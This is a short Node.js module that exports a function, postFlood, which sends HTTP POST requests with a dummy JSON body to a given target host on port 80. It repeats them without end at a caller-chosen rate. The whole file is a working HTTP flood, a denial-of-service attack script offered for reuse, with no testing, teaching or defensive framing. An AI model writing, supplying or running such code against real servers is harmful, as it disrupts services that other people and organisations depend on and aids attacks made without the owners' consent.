const http = require('http');

function postFlood(target, rateLimit) {
    setInterval(() => {
        const postData = JSON.stringify({
            'key1': 'value1',
            'key2': 'value2'
        });

        const options = {
            hostname: target,
            port: 80,
            path: '/',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = http.request(options, (res) => {
            res.on('data', (chunk) => {
                console.log('Received: ' + chunk);
            });
        });

        req.on('error', (err) => {
            console.error('Error: ' + err.message);
        });

        req.write(postData);
        req.end();
    }, 1000 / rateLimit);
}

module.exports = postFlood;
